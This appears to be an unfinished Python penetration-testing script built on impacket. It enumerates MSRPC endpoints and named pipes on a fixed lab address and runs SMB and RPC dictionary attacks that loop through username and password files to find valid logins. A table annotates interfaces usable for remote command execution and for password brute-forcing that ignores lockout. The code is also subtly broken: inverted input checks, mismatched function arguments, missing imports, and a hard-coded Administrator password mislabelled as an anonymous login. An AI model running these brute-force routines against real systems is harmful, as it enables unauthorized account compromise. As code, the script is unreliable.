from impacket.dcerpc.v5 import epm, transport
from impacket import uuid
from impacket.dcerpc.v5 import mgmt
from impacket.dcerpc.v5.epm import KNOWN_UUIDS
from impacket.smbconnection import SMBConnection


KNOWN_UUIDS = {
    "12345778-1234-abcd-ef00-0123456789ab": {
        "pipe": r"\pipe\lsarpc",
        "description": "LSA interface, used to enumerate users."
    },
    "3919286a-b10c-11d0-9ba8-00c04fd92ef5": {
        "pipe": r"\pipe\lsarpc",
        "description": "LSA Directory Services (DS) interface, used to enumerate domains and trust relationships."
    },
    "12345778-1234-abcd-ef00-0123456789ac": {
        "pipe": r"\pipe\samr",
        "description": "LSA SAMR interface, used to access public SAM database elements (e.g., usernames) and brute-force user passwords regardless of account lockout policy."
    },
    "1ff70682-0a51-30e8-076d-740be8cee98b": {
        "pipe": r"\pipe\atsvc",
        "description": "Task scheduler, used to remotely execute commands."
    },
    "338cd001-2244-31f1-aaaa-900038001003": {
        "pipe": r"\pipe\winreg",
        "description": "Remote registry service, used to access and modify the system registry."
    },
    "367abb81-9844-35f1-ad32-98f038001003": {
        "pipe": r"\pipe\svcctl",
        "description": "Service control manager and server services, used to remotely start and stop services and execute commands."
    },
    "4b324fc8-1670-01d3-1278-5a47bf6ee188": {
        "pipe": r"\pipe\srvsvc",
        "description": "Service control manager and server services, used to remotely start and stop services and execute commands."
    },
    "4d9f4ab8-7d1c-11cf-861e-0020af6e7c57": {
        "pipe": r"\pipe\epmapper",
        "description": "DCOM interface, used for brute-force password grinding and information gathering via WM."
    },
}

class MSRPC:
    def __init__(self, 
                 ip: str, 
                 port:int = 135, 
                 pipes:list = [],
                 username:str = "",
                 password:str = "",
                 username_file:str = None,
                 password_file:str = None
                  ):
        
        self.ip = ip
        self.port = port
        self.dangerous = {}
        self.standards = {}
        self.pipes = pipes
        self.username = username
        self.password = password
        self.username_file = username_file
        self.password_file = password_file
  

    def run(self):
        #self.enumerate_epm_endpoints()
        #self.enumerate_open_known_pipes()
        #self.enumerate_mgmt()
        self.test_anonymous_smb_access()
        self.smb_dictionary_attack()
        #self.enumerate_mgmt()



    def drawLine(self):
        print ('-' * 75)

    def drawDoubleLine(self):
        print ('=' * 75)

    def _text_or_file(self, text: str | None, file_path: str | None):
        """
            One domain/address or file.
        """
        if text:
            return [text.strip()]
        elif file_path:
            try:
                with open(file_path, 'r') as file:
                    return [line.strip() for line in file if line.strip()]
            except Exception as e:
                print(Fore.RED + f"[!] ERROR: reading file {file_path}: {e}"+ Style.RESET_ALL)
                return []
        else:
            print(Fore.RED + "[!] ERROR: Neither text nor file input provided."+ Style.RESET_ALL)
            return []
        
    def enumerate_epm_endpoints(self):

        try:
            rpctransport = transport.DCERPCTransportFactory(f'ncacn_ip_tcp:{self.ip}[{self.port}]')

            # Inicializujeme spojení
            dce = rpctransport.get_dce_rpc()
            dce.connect()

            # Enumerujeme všechny endpointy
            entries = epm.hept_lookup(None, dce=dce)

            for entry in entries:
                binding = epm.PrintStringBinding(entry['tower']['Floors'])
                tmpUUID = str(entry['tower']['Floors'][0])
                tmp_endpoints = {}


                if (tmpUUID in tmp_endpoints) is not True:
                    tmp_endpoints[tmpUUID] = {}
                    tmp_endpoints[tmpUUID]['Bindings'] = list()
                
                if uuid.uuidtup_to_bin(uuid.string_to_uuidtup(tmpUUID))[:18] in epm.KNOWN_UUIDS:
                    tmp_endpoints[tmpUUID]['EXE'] = epm.KNOWN_UUIDS[uuid.uuidtup_to_bin(uuid.string_to_uuidtup(tmpUUID))[:18]]
                else:
                    tmp_endpoints[tmpUUID]['EXE'] = 'N/A'
                tmp_endpoints[tmpUUID]['annotation'] = entry['annotation'][:-1].decode('utf-8')
                tmp_endpoints[tmpUUID]['Bindings'].append(binding)

                if tmpUUID[:36] in epm.KNOWN_PROTOCOLS:
                    tmp_endpoints[tmpUUID]['Protocol'] = epm.KNOWN_PROTOCOLS[tmpUUID[:36]]

                else:
                    tmp_endpoints[tmpUUID]['Protocol'] = "N/A"

            
            for endpoint in list(tmp_endpoints.keys()):
                print("Protocol: %s " % tmp_endpoints[endpoint]['Protocol'])
                print("Provider: %s " % tmp_endpoints[endpoint]['EXE'])
                print("UUID    : %s %s" % (endpoint, tmp_endpoints[endpoint]['annotation']))
                print("Bindings: ")
                for binding in tmp_endpoints[endpoint]['Bindings']:
                    print("          %s" % binding)
                print("")


            dce.disconnect()
            print(f"Endpoints count: {len(tmp_endpoints)}")

        except Exception as e:
            print(f"[!] Chyba při enumeraci EPM: {e}")

        return tmp_endpoints

    def try_authenticated_pipe_bind(self, pipe, domain=''):
        rpctransport = transport.DCERPCTransportFactory(f'ncacn_np:192.168.253.131[\\pipe\\{pipe}]')
        # Setting credentials for SMB
        rpctransport.set_credentials(self.username, self.password)

        # Setting remote host and port for SMB
        rpctransport.setRemoteHost(self.ip)

        try:
            # Inicializujeme spojení
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            print(f"[+] Accessible pipe: \\\\{self.ip}\\pipe\\{pipe}")
       
            return True
        except Exception as e:
            print(f"[-] Failed to bind/authenticate to pipe {pipe}: {e}")
            return False

    def enumerate_open_known_pipes(self):
        if self.pipes:
            known_pipes = self.pipes
        else:
            known_pipes = [
                'epmapper', 'browser', 'eventlog', 'lsarpc', 'samr', 'svcctl',
                'spoolss', 'netlogon', 'atsvc', 'wkssvc', 'ntsvcs'
            ]

        for pipe in known_pipes:
            try:
               self.try_authenticated_pipe_bind(pipe)
            except Exception as e:
                print(f"[!] Chyba při enumeraci EPM: {e}")
                continue

        return None
    
    def rpc_pipe_dictionary_attack(self, pipe, domain='', verbose=True):
        if not self.username_file and not self.username:
            print("[!] No username or username list provided.")
            return
        if not self.password_file and not self.password:
            print("[!] No password or password list provided.")
            return

        usernames = self._text_or_file(self.username, self.username_file)
        passwords = self._text_or_file(self.password, self.password_file)

        found = []

        for username in usernames:
            for password in passwords:
                if verbose:
                    print(f"[*] Trying {domain}\\{username}:{password}")
                try:
                    success = self.try_authenticated_pipe_bind(
                        host=self.ip,
                        username=username,
                        password=password,
                        pipe=pipe,
                        domain=domain
                    )
                    if success:
                        found.append((username, password))
                        print(f"[+] Found valid credentials: {domain}\\{username}:{password}")
                except Exception as e:
                    if verbose:
                        print(f"[-] Error with {domain}\\{username}:{password} - {str(e).strip()}")
                    continue

        return found

    
    def enumerate_mgmt(self):

        dangerous_uuids = []
        other_uuids = []

        def handle_discovered_tup(tup):
            

            if tup[0] in epm.KNOWN_PROTOCOLS:
                print("Protocol: %s" % (epm.KNOWN_PROTOCOLS[tup[0]]))
            else:
                print("Procotol: N/A")

            if uuid.uuidtup_to_bin(tup)[: 18] in KNOWN_UUIDS:
                print("Provider: %s" % (KNOWN_UUIDS[uuid.uuidtup_to_bin(tup)[:18]]))
            else:
                print("Provider: N/A")

            print("UUID: %s v%s" % (tup[0], tup[1]))
         
        rpctransport = transport.DCERPCTransportFactory(f'ncacn_ip_tcp:{self.ip}[{self.port}]')
        
        
        try:
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(mgmt.MSRPC_UUID_MGMT)
            print(f"[+] Connected and bound to MGMT interface at {self.ip}:{self.port}")
            
            # Retrieving interfaces UUIDs from the MGMT interface
            ifids = mgmt.hinq_if_ids(dce)
            

            uuidtups = set(
            uuid.bin_to_uuidtup(ifids['if_id_vector']['if_id'][index]['Data'].getData())
            for index in range(ifids['if_id_vector']['count'])
            )

            uuidtups.add(('AFA8BD80-7D8A-11C9-BEF4-08002B102989', '1.0'))

            for tup in sorted(uuidtups):
                uuid_str = tup[0].lower()

                if uuid_str in KNOWN_UUIDS:
                    dangerous_uuids.append(tup)
                else:
                    other_uuids.append(tup)

            if other_uuids:
                for tup in other_uuids:
                    handle_discovered_tup(tup)

            print("-----------------------------------------------------------")       
            
            if dangerous_uuids:
                print("Known Exploitable or Informative UUIDs")
                for tup in dangerous_uuids:
                    handle_discovered_tup(tup)
                    print(f"Named Pipe: {KNOWN_UUIDS[tup[0].lower()]['pipe']}")
                    print(f"Description: {KNOWN_UUIDS[tup[0].lower()]['description']}")

            

        except Exception as e:
            print(f"[!] Failed to connect/bind to MGMT interface: {e}")
            return
        
    def test_anonymous_smb_access(self):
        #Otestvat
        
        try:
            smb = SMBConnection(self.ip, self.ip, sess_port=self.port, timeout=5)
            smb.login('Administrator', 'Password123!')  # anonymní login (null session)

            # pokus o přístup k IPC$
            try:
                shares = smb.listShares()
                print(f"[+] Successfully connected anonymously to {self.ip} (IPC$ accessible).")
                for share in shares:
                    print(f"    Share: {share['shi1_netname']}")
                smb.logoff()
                return True
            except Exception as e:
                print(f"[~] Anonymous login OK, but IPC$ access failed: {e}")
                smb.logoff()
                return False

        except Exception as e:
            print(f"[-] Anonymous SMB connection to {self.ip} failed: {e}")
            return False
        
    def smb_dictionary_attack(self, domain='', verbose=True):
        #Otestovat

        if not self.username_file or self.username:
            print("[!] No username or username list provided.")
            return
        if not self.password_file or self.password:
            print("[!] No password or password list provided.")
            return
        
        usernames = self._text_or_file(self.username, self.username_file)
        passwords = self._text_or_file(self.password, self.password_file)
   
        found = []

        for username in usernames:
            for password in passwords:
                try:
                    smb = SMBConnection(self.ip, self.ip, sess_port=self.port, timeout=3)
                    smb.login(username, password, domain)

                    print(f"[+] Success: {domain}\\{username}:{password}")
                    found.append((username, password))

                    smb.logoff()
                except Exception as e:
                    if verbose:
                        print(f"[-] Failed: {domain}\\{username}:{password} ({str(e).strip()})")
                    continue

        return found

    def try_authenticated_bind(self, host, username, password,  uuid, domain=''):
        binding = f'ncacn_ip_tcp:{host}'
        rpctransport = transport.DCERPCTransportFactory(binding)
        rpctransport.set_credentials(username, password, domain)

        try:
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(uuid)
            print("[+] Successfully authenticated and bound to interface.")
            dce.disconnect()
            return True
        except Exception as e:
            print(f"[-] Failed to bind/authenticate: {e}")
            return False

    def rpc_uuid_dictionary_attack(self, uuid, domain='', verbose=True):
        #Otestovat

        if not self.username_file or self.username:
            print("[!] No username or username list provided.")
            return
        if not self.password_file or self.password:
            print("[!] No password or password list provided.")
            return
        
        usernames = self._text_or_file(self.username, self.username_file)
        passwords = self._text_or_file(self.password, self.password_file)
   
        found = []

        for username in usernames:
            for password in passwords:
                try:
                    self.try_authenticated_bind(self.ip, self.username, self.password, uuid)
                except Exception as e:
                    if verbose:
                        print(f"[-] Failed: {domain}\\{username}:{password} ({str(e).strip()})")
                    continue

        return found


def main():  

    test = MSRPC("192.168.253.131", 135, username_file= "C:\\Users\\monav\\Desktop\\username.txt", password_file="C:\\Users\\monav\\Desktop\\passwords.txt" )
    test.run()

if __name__ == '__main__':
    main()